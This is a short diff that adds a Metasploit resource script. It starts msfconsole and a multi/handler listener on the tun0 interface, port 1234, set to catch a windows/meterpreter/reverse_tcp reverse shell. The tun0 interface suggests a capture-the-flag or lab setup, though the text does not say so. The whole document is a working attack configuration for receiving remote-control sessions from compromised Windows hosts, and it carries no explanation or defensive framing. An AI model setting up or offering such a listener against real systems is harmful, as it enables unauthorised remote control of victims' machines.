@@ -1,0 +1,6 @@
+msfconsole
+use exploit/multi/handler
+set lhost tun0
+set lport 1234
+set payload windows/meterpreter/reverse_tcp
+run
